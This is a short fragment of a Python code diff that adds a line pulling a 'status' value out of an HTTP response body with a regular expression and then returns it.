+        result = re.search(r'"status":"(.*?)"', response.text).group(1)
 
     return result
     
